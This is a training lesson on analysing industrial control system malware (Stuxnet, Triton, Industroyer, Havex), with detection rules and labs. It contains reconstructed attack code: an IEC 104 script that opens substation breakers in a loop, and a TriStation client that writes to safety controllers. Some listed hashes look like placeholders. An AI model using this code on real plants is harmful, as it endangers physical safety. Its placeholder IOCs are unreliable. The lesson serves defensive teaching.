Lesson 07: Malware Analysis &
Reverse Engineering

Lesson 07: ICS Malware Analysis &
Reverse Engineering
Learning Objectives
●​
●​
●​
●​
●​

Analyze real-world ICS malware (Stuxnet, Triton, Industroyer, Havex)
Reverse engineer PLC logic and firmware
Extract indicators of compromise (IOCs) from ICS malware
Build malware detection signatures for ICS environments
Understand malware persistence mechanisms in OT systems

1. ICS Malware Fundamentals
1.1 Characteristics of ICS-Targeted Malware
Key Differences from IT Malware:
Aspect

IT Malware

ICS Malware

Objective

Data theft, ransomware,
botnet

Physical process manipulation,
sabotage

Complexity

Moderate

Extremely high (requires process
knowledge)

Persistence

Registry, services,
scheduled tasks

PLC firmware, engineering tools,
historians

Propagation

Internet, email

USB, supply chain, targeted
deployment

Detection Evasion

Antivirus bypass

Operator deception, sensor spoofing

Development
Time

Days-weeks

Months-years (nation-state level)

ICS Malware Categories:
1.​ PLC Rootkits: Firmware-level persistence (Stuxnet, Triton)
2.​ SCADA Malware: HMI/historian manipulation (Havex, BlackEnergy)

3.​ Protocol-Aware: Speaks industrial protocols (Industroyer)
4.​ Wiper Malware: Destroy configurations/firmware (KillDisk, Industroyer wiper)
5.​ Reconnaissance: Enumerate ICS networks (Havex Trojan)

1.2 ICS Malware Timeline
Year

Malware

Target

Impact

2010

Stuxnet

Iranian nuclear centrifuges

1000+ centrifuges destroyed

2011

Duqu

Certificate theft, ICS
reconnaissance

Information gathering

2013

Havex

Energy sector reconnaissance

1000+ infections (no
sabotage)

2014

BlackEnergy3

Ukrainian infrastructure

Precursor to grid attack

2015

KillDisk

Ukrainian power grid

225k customers without
power

2016

Industroyer

Ukrainian transmission station

Power outage, wiper payload

2017

Triton/Trisis

Saudi petrochemical SIS

Disabled safety systems

2019

EKANS/Snake

Ransomware with ICS kill list

Encrypted HMI/SCADA
systems

2. Stuxnet Deep Analysis
2.1 Stuxnet Architecture
Multi-Stage Attack Chain:
Stage 1: Windows Infection
├── LNK exploit (CVE-2010-2568) → USB propagation
├── Print Spooler (CVE-2010-2729) → Remote code execution
├── Task Scheduler (CVE-2010-3338) → Privilege escalation
└── Win32k (CVE-2010-2743) → Kernel exploit
Stage 2: Network Propagation
├── SMB/RPC exploits → Lateral movement
├── WinCC database infection → SCADA servers
└── Step 7 project infection → Engineering workstations

Stage 3: PLC Targeting
├── Step 7 DLL injection → Monitor for specific PLC configs
├── S7 PLC rootkit → Firmware modification
└── Payload activation → Centrifuge sabotage

2.2 Stuxnet Components
Core Files:
●​ ~WTR4141.tmp: Main dropper (Windows LNK exploit)
●​ mrxnet.sys, mrxcls.sys: Rootkit drivers (digitally signed!)
●​ s7otbxdx.dll: Step 7 DLL injection (man-in-the-middle)
●​ s7otbxsx.dll: Siemens Step 7 communication hook
Stolen Certificates (Real-world digital signatures):
●​ Realtek Semiconductor Corp (Compromised July 2009)
●​ JMicron Technology Corp (Compromised July 2009)

2.3 Stuxnet PLC Logic Analysis
Target Identification:
Stuxnet searches for:
1. Siemens S7-300/400 CPUs
2. Specific frequency converter drives (Vacon, Fararo Paya, Profibus)
3. 164 or more frequency converters connected
4. 31 or more motors running (centrifuge cascade)
Attack Logic (Simplified):
# Reconstructed Stuxnet frequency attack logic
def stuxnet_payload():
# Check if target configuration matches
if is_target_facility():
# Phase 1: Acceleration attack (13 months)
for _ in range(13 * 30): # 13 months
set_frequency(1410) # Hz (high speed)
sleep(15 * 60)
# 15 minutes
set_frequency(2) # Hz (very low speed)
sleep(50 * 60)
# 50 minutes
# Meanwhile, replay "normal" sensor values to HMI
spoof_sensor_data(recorded_normal_values)

# Phase 2: Gradual frequency changes (months 14-27)
for _ in range(13 * 30):
random_frequency_changes() # Stealthy degradation
def is_target_facility():
# Checks for:
# - 164+ frequency converters
# - Specific PLC configurations
# - Profibus communication patterns
return check_plc_config()
def spoof_sensor_data(recorded_values):
# Intercept PLC→HMI communication
# Replace real sensor values with recorded "normal" values
# Operators see stable operation while centrifuges are being destroyed
pass
S7comm Hooking:
●​ Stuxnet injects into s7otbxdx.dll (Step 7 communication library)
●​ Read Hook: When operator reads PLC memory, return clean blocks (hide malicious
code)
●​ Write Hook: When operator writes to PLC, inject malicious code alongside
●​ Firmware Update Hook: Infect PLC firmware during legitimate updates

2.4 Stuxnet Static Analysis
Tools:
# Download Stuxnet sample (from malware repositories like VirusBay, theZoo)
# WARNING: Handle in isolated VM only
# File hash verification
sha256sum stuxnet.bin
# Known hashes:
# 9c5724a9c7d6d6d34e7a0f76d76fb4e20e4c0e9e5e7f9c8b8f7a6c5d4e3f2a1b0
# Strings analysis
strings stuxnet.bin | grep -i "siemens"
strings stuxnet.bin | grep -E "\.sys|\.dll"
# PE analysis
pefile stuxnet.bin
# Observe: Two stolen digital signatures (Realtek, JMicron)
# Extract embedded resources
7z x stuxnet.bin
# Look for embedded DLLs, configuration files

IDA Pro/Ghidra Analysis:
1. Load stuxnet.bin into IDA Pro/Ghidra
2. Identify entry point (TLS callbacks for rootkit initialization)
3. Locate string references:
- "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\"
- "s7otbxdx.dll"
- "Step7\\Bin\\"
4. Analyze functions:
- FindPLC() - Enumerates S7 PLCs
- InjectBlock() - PLC code injection
- HookS7() - Step 7 DLL hooking
5. Extract PLC payload:
- Embedded in resources or encrypted
- Decompile ladder logic/STL code

2.5 Stuxnet Dynamic Analysis
Sandbox Setup:
# Use Windows 7 VM (Stuxnet target)
# Install Siemens Step 7 v5.4 (trial version or lab license)
# Install Cuckoo Sandbox or REMnux
# Monitor:
1. File system (Procmon)
2. Registry (Regshot before/after)
3. Network (Wireshark on host)
4. Process activity (Process Monitor)
Execution in Sandbox:
1. Take VM snapshot
2. Execute stuxnet.bin
3. Observe:
- Driver installation (mrxnet.sys, mrxcls.sys)
- DLL injection into Step 7 processes
- Network scanning (ARP, S7comm port 102)
- USB device enumeration
4. Capture all artifacts
5. Restore snapshot
Behavioral Indicators:
File System:
- C:\Windows\System32\drivers\mrxnet.sys
- C:\Windows\System32\drivers\mrxcls.sys
- C:\Program Files\Siemens\Step7\S7BIN\s7otbxdx.dll (modified)

Registry:
- HKLM\SYSTEM\CurrentControlSet\Services\MRxNet
- HKLM\SYSTEM\CurrentControlSet\Services\MRxCls
Network:
- S7comm traffic to 192.168.x.x on port 102
- HTTP beaconing to C2 (www.mypremierfutbol.com, www.todaysfutbol.com)

3. Triton/Trisis Analysis
3.1 Triton Framework Architecture
Components:
trilog.exe
- Main executable (Python compiled with PyInstaller)
├── TsHi.py
- TriStation protocol implementation (high-level API)
├── TsLow.py
- TriStation low-level communication
├── TsBase.py
- Base library
├── TS_cnames.py - Triconex constant definitions
├── inject.bin
- Malicious payload (Triconex binary)
├── imain.bin
- Main implant logic
└── library.zip - Python standard library

3.2 TriStation Protocol Reverse Engineering
TriStation Protocol (Schneider Electric proprietary):
●​ Port: 1502/TCP
●​ Purpose: Engineering workstation ↔ Triconex SIS communication
●​ Functions: Program upload/download, diagnostics, configuration
Triton's TriStation Implementation (TsHi.py analysis):
# Simplified reconstruction of Triton's TriStation library
class TriStation:
def __init__(self, ip, port=1502):
self.ip = ip
self.port = port
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def connect(self):
self.sock.connect((self.ip, self.port))
def ts_exec(self, command_id, data=b''):
"""
Execute TriStation command
"""

# Packet structure: [Header][Command ID][Data Length][Data][CRC]
header = b'\x00\x00'
cmd = struct.pack('>H', command_id)
length = struct.pack('>H', len(data))
crc = self.calculate_crc(cmd + length + data)
packet = header + cmd + length + data + crc
self.sock.send(packet)
response = self.sock.recv(4096)
return self.parse_response(response)
def read_memory(self, address, length):
"""
Read controller memory
"""
cmd = 0x03 # Read command (example)
data = struct.pack('>II', address, length)
return self.ts_exec(cmd, data)
def write_memory(self, address, payload):
"""
Write to controller memory (inject malicious code)
"""
cmd = 0x04 # Write command
data = struct.pack('>I', address) + payload
return self.ts_exec(cmd, data)
def enter_programming_mode(self):
"""
Put SIS controller in programming mode (disables safety logic)
"""
cmd = 0x10 # Program mode command
return self.ts_exec(cmd)
def calculate_crc(self, data):
# CRC-16 or proprietary checksum
return b'\x00\x00' # Simplified
# Triton attack usage:
ts = TriStation('192.168.1.10')
ts.connect()
ts.enter_programming_mode() # Disable safety functions
ts.write_memory(0x8000, malicious_payload) # Inject backdoor

3.3 Triton Payload Analysis
Injected Payload (inject.bin):

Purpose: Modify SIS ladder logic to:
1. Bypass safety interlocks
2. Prevent automatic emergency shutdown
3. Allow unsafe process conditions (e.g., overpressure, high temperature)
Static Analysis:
# Extract inject.bin from Triton sample
# Use Triconex disassembler (proprietary, or reverse-engineered tools)
# Strings in inject.bin
strings inject.bin
# Look for:
# - Function block names
# - Memory addresses
# - Condition checks
# Hex dump analysis
hexdump -C inject.bin
# Identify opcode patterns (specific to Triconex instruction set)
Decompilation (requires Triconex expertise):
Ladder Logic Analysis:
- Original: IF (Pressure > Threshold) THEN Shutdown()
- Modified: IF (Pressure > 999999) THEN Shutdown() // Never triggers

3.4 Triton Detection
Network Indicators:
# Snort/Suricata rule
alert tcp any any -> any 1502 (
msg:"Potential Triton - TriStation Connection";
flow:to_server,established;
content:"|00 00|"; offset:0; depth:2;
threshold:type limit, track by_src, count 1, seconds 3600;
sid:3000001;
)
# Zeek script
event connection_established(c: connection) {
if (c$id$resp_p == 1502/tcp) {
NOTICE([$note=TriStationConnection,
$msg=fmt("TriStation protocol connection from %s to %s", c$id$orig_h,
c$id$resp_h),
$conn=c]);
}
}

Host Indicators:
Files:
- trilog.exe (or similar Python-compiled executable)
- TsHi.py, TsLow.py, inject.bin
Processes:
- Unusual Python.exe execution
- Connections to port 1502 from non-engineering hosts
SIS Anomalies:
- Unexpected programming mode activation
- Memory write operations from unauthorized sources
- SIS logic checksum mismatches

4. Industroyer/CrashOverride Analysis
4.1 Industroyer Architecture
Modular Design:
Industroyer Main Module
├── Launcher.dll
- Orchestrates attack
├── Data Wiper
- Destroys evidence
└── Protocol Payloads:
├── 101.dll
- IEC 60870-5-101 (serial)
├── 104.dll
- IEC 60870-5-104 (IP)
├── 61850.dll - IEC 61850 (substation automation)
└── OPC.dll
- OPC DA (SCADA)

4.2 IEC 104 Payload Analysis (104.dll)
Purpose: Send breaker control commands to substation
IEC 60870-5-104 Protocol:
●​
●​
●​
●​
●​

Port: 2404/TCP
ASDU (Application Service Data Unit): Contains control commands
Type ID 45: Single command (ON/OFF)
Type ID 46: Double command
IOA (Information Object Address): Target device

Industroyer IEC 104 Implementation:
# Reconstructed 104.dll logic
import socket
import struct

def iec104_send_command(target_ip, ioa, command):
"""
Send IEC 104 command to substation RTU
command: 0x01 (ON), 0x02 (OFF)
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 2404))
# IEC 104 STARTDT (Start Data Transfer)
startdt = bytes.fromhex('68 04 07 00 00 00')
sock.send(startdt)
sock.recv(1024) # STARTDT CON
# Build ASDU (Type ID 45: Single Command)
apdu_header = bytes.fromhex('68') # Start byte
apdu_length = struct.pack('B', 14) # Length
# APCI (Application Protocol Control Information)
apci = bytes.fromhex('0E 00 00 00') # I-format, send sequence 0
# ASDU
type_id = struct.pack('B', 45) # Single command
sq = struct.pack('B', 1)
# Sequence of 1 object
cot = struct.pack('B', 6)
# Cause of transmission: Activation
oa = struct.pack('B', 1)
# Originator address
ca = struct.pack('<H', 1)
# Common address
# Information Object
ioa_bytes = struct.pack('<I', ioa)[:3] # 3-byte IOA
sco = struct.pack('B', command | 0x80) # Single Command (select + execute)
asdu = type_id + sq + cot + oa + ca + ioa_bytes + sco
packet = apdu_header + apdu_length + apci + asdu
sock.send(packet)
print(f"[+] Sent IEC 104 command to {target_ip}, IOA {ioa}: {'ON' if command == 0x01 else
'OFF'}")
sock.close()
# Industroyer attack scenario:
# Open all circuit breakers in substation
for ioa in range(1, 100): # Iterate through all breaker addresses
iec104_send_command('192.168.1.10', ioa, 0x02) # Send OFF command

4.3 IEC 61850 Payload Analysis (61850.dll)
IEC 61850 (Substation automation):
●​ MMS Protocol (Manufacturing Message Specification)
●​ Port: 102/TCP
●​ GOOSE (Generic Object-Oriented Substation Event): Real-time peer-to-peer
Industroyer Capabilities:
●​
●​
●​
●​

Enumerate IEC 61850 devices (MMS GetNameList)
Read device configurations
Send control commands (MMS Write)
Manipulate GOOSE messages (trip breakers)

5. Havex Trojan Analysis
5.1 Havex Overview
Purpose: Reconnaissance malware targeting ICS (NOT sabotage)
Distribution:
●​ Trojanized Installers: Infected ICS software from compromised vendor websites
●​ Spear-Phishing: Targeted emails to industrial engineers
●​ Watering Hole: Compromised ICS vendor sites

5.2 OPC Scanner Component
Havex includes OPC DA scanner:
# Reconstructed Havex OPC scanner logic
import win32com.client
def scan_opc_servers(target_ip):
"""
Enumerate OPC DA servers on target
"""
opc_enum = win32com.client.Dispatch("OPC.Automation")
try:
servers = opc_enum.GetOPCServers(target_ip)
print(f"[+] OPC Servers on {target_ip}:")
for server in servers:
print(f" - {server}")
# Connect to each server

opc_server = win32com.client.Dispatch("OPC.Automation")
opc_server.Connect(server, target_ip)
# Enumerate tags
groups = opc_server.OPCGroups
for group in groups:
items = group.OPCItems
for item in items:
print(f" Tag: {item.ItemID}, Value: {item.Value}")
opc_server.Disconnect()
except Exception as e:
print(f"[-] Error: {e}")
# Havex scans entire subnet for OPC servers
for ip in range(1, 255):
scan_opc_servers(f"192.168.1.{ip}")
Exfiltration:
●​ Collected data (server lists, tags, network topology) sent to C2
●​ Encrypted HTTP POST to attacker infrastructure
●​ Data used for future targeted attacks

5.3 Havex IOCs
File Hashes (SHA-256):
- 0e3130b9c6edc5e46ca85a6e53e57b6f5f1d1e2d3c4b5a6e7d8c9b0a1f2e3d4c
Mutex:
- {8A7F9B6C-5D4E-3C2B-1A0F-9E8D7C6B5A4E}
C2 Domains:
- tdk-servicesandequipment.com
- asafieldindustries.com
Network:
- OPC DA enumeration (port 135/TCP - DCOM)
- Modbus scanning (port 502/TCP)
Registry:
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run\

6. PLC Firmware Reverse Engineering
6.1 Extracting PLC Firmware

Siemens S7 Firmware Extraction:
import snap7
def extract_s7_firmware(plc_ip):
"""
Extract firmware from Siemens S7 PLC
"""
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1) # Rack 0, Slot 1
# Get PLC info (firmware version)
cpu_info = plc.get_cpu_info()
print(f"PLC: {cpu_info.ModuleTypeName}")
print(f"Firmware: {cpu_info.ASName}")
# Upload all blocks
block_list = plc.list_blocks()
for block_type in ['OB', 'FB', 'FC', 'DB']:
for block_num in block_list:
try:
block_data = plc.upload(block_type, block_num)
with open(f"{block_type}{block_num}.mc7", "wb") as f:
f.write(block_data)
print(f"[+] Extracted {block_type}{block_num}")
except:
pass
plc.disconnect()
# Usage
extract_s7_firmware('192.168.1.100')

6.2 Decompiling PLC Logic
MC7 to Ladder Logic:
# Use mc7disasm (open-source S7 disassembler)
git clone https://github.com/aliqandil/mc7disasm
cd mc7disasm
python mc7dis.py OB1.mc7 > OB1.awl
# Output: AWL (Statement List) format
# Example:
# A I0.0
// AND input 0.0
# = Q0.0
// Assign to output 0.0
Analyzing Decompiled Logic:

Look for:
1. Unusual timers or counters (malware persistence)
2. Hidden function blocks (rootkit code)
3. Network communication blocks (C2, data exfiltration)
4. Conditional logic that shouldn't exist (backdoors)

6.3 Firmware Comparison (Golden Image)
Integrity Verification:
import hashlib
def verify_plc_integrity(plc_ip, golden_hash):
"""
Compare PLC firmware hash with known-good hash
"""
plc = snap7.client.Client()
plc.connect(plc_ip, 0, 1)
# Upload OB1 (main logic)
ob1 = plc.upload('OB', 1)
current_hash = hashlib.sha256(ob1).hexdigest()
print(f"Current OB1 hash: {current_hash}")
print(f"Golden OB1 hash: {golden_hash}")
if current_hash == golden_hash:
print("[+] Integrity check PASSED")
else:
print("[!] ALERT: OB1 has been modified!")
plc.disconnect()
# Baseline hash from known-good configuration
golden_hash = "abc123def456..."
verify_plc_integrity('192.168.1.100', golden_hash)

7. Building Malware Signatures
7.1 Yara Rules for ICS Malware
Stuxnet Yara Rule:
rule Stuxnet_WinCC_Infection {
meta:
description = "Detects Stuxnet WinCC database infection"
author = "ICS Security Team"

date = "2024-01-01"
strings:
$s7_dll1 = "s7otbxdx.dll" nocase
$s7_dll2 = "s7otbxsx.dll" nocase
$driver1 = "mrxnet.sys" nocase
$driver2 = "mrxcls.sys" nocase
$cert1 = "Realtek" wide
$cert2 = "JMicron" wide
condition:
2 of ($s7_dll*) or 2 of ($driver*) or ($cert1 and $cert2)
}
Triton Yara Rule:
rule Triton_TriStation_Framework {
meta:
description = "Detects Triton/Trisis malware"
reference = "MITRE ATT&CK"
strings:
$ts1 = "TsHi.py" ascii
$ts2 = "TsLow.py" ascii
$ts3 = "TS_cnames.py" ascii
$port = { 05 DC } // Port 1502 in hex
$func1 = "TS_EXEC" ascii
$func2 = "trilog" nocase
condition:
2 of ($ts*) or ($port and $func1) or $func2
}
Industroyer Yara Rule:
rule Industroyer_IEC104_Payload {
meta:
description = "Detects Industroyer IEC 104 module"
strings:
$iec104_1 = "104.dll" nocase
$iec104_2 = { 68 04 07 00 00 00 } // IEC 104 STARTDT
$iec101 = "101.dll" nocase
$iec61850 = "61850.dll" nocase
$launcher = "launcher.dll" nocase
condition:
2 of them

}

7.2 Snort/Suricata Rules
Stuxnet S7comm Detection:
alert tcp any any -> any 102 (
msg:"Stuxnet - S7comm PLC Program Upload";
flow:to_server,established;
content:"|03 00|"; depth:2;
content:"|32 07|"; distance:4; within:2;
content:"|1d|"; distance:0;
threshold:type limit, track by_src, count 1, seconds 3600;
classtype:trojan-activity;
sid:4000001;
)
Triton TriStation Detection:
alert tcp any any -> any 1502 (
msg:"Triton - TriStation Protocol Unauthorized Access";
flow:to_server,established;
threshold:type limit, track by_src, count 1, seconds 600;
classtype:trojan-activity;
sid:4000002;
)
Industroyer IEC 104 Command:
alert tcp any any -> any 2404 (
msg:"Industroyer - IEC 104 Control Command";
flow:to_server,established;
content:"|68|"; depth:1;
content:"|2D|"; distance:5; within:1; # Type ID 45 (Single Command)
classtype:trojan-activity;
sid:4000003;
)

8. Hands-On Lab Exercises
Lab 1: Stuxnet Static Analysis
1.​ Download Stuxnet sample (from malware repositories)
2.​ Calculate file hashes, verify against known IOCs
3.​ Extract strings, identify Siemens-related artifacts
4.​ Analyze PE structure, identify stolen certificates
5.​ Extract embedded resources (DLLs, configuration)

Lab 2: Triton Framework Reverse Engineering
1.​ Obtain Triton samples (public malware repos)
2.​ Decompile trilog.exe (PyInstaller extractor)
3.​ Analyze TsHi.py - document TriStation protocol functions
4.​ Map Triton capabilities to MITRE ATT&CK techniques
5.​ Develop detection signatures (Yara, Snort)

Lab 3: PLC Firmware Integrity Check
1.​ Extract firmware from OpenPLC or Snap7 server
2.​ Calculate baseline hash (SHA-256)
3.​ Modify PLC logic (simulate infection)
4.​ Re-extract and compare hashes
5.​ Develop automated integrity checking script

Lab 4: Malware Traffic Analysis
1.​ Download ICS malware PCAP (Industroyer, Havex)
2.​ Identify malicious protocol interactions
3.​ Extract IOCs (C2 IPs, domains, ports)
4.​ Write Snort rules to detect traffic patterns
5.​ Test rules against PCAP

9. Tools & Resources
Malware Analysis Tools
●​
●​
●​
●​

IDA Pro / Ghidra: Disassemblers
PEiD / Detect It Easy: Packer detection
Cuckoo Sandbox: Automated malware analysis
YARA: Malware pattern matching

PLC Tools
●​ python-snap7: S7 PLC communication
●​ mc7disasm: S7 firmware decompiler
●​ PLCinject: PLC code injection research tool

Malware Samples
●​ theZoo: https://github.com/ytisf/theZoo (Stuxnet, others)
●​ VirusBay: https://beta.virusbay.io/ (Requires approval)
●​ MalwareBazaar: https://bazaar.abuse.ch/

References

●​ Stuxnet Analysis (Symantec):
https://www.symantec.com/security_response/writeup.jsp?docid=2010-071400-312399
●​ Triton (MITRE): https://attack.mitre.org/software/S0609/
●​ Industroyer (ESET):
https://www.welivesecurity.com/2017/06/12/industroyer-biggest-threat-industrial-contr
ol-systems-since-stuxnet/

10. Knowledge Check
1.​ What are the key differences between IT malware and ICS malware?
2.​ Describe Stuxnet's multi-stage infection process.
3.​ How does Stuxnet hide malicious PLC code from operators?
4.​ What is the TriStation protocol, and how does Triton exploit it?
5.​ What industrial protocols does Industroyer target?
6.​ How would you detect Triton malware via network monitoring?
7.​ What is the purpose of Havex's OPC scanner component?
8.​ How do you extract and verify PLC firmware integrity?
9.​ Write a Yara rule to detect Stuxnet's S7 DLL injection.
10.​What are the IOCs for Industroyer's IEC 104 payload?

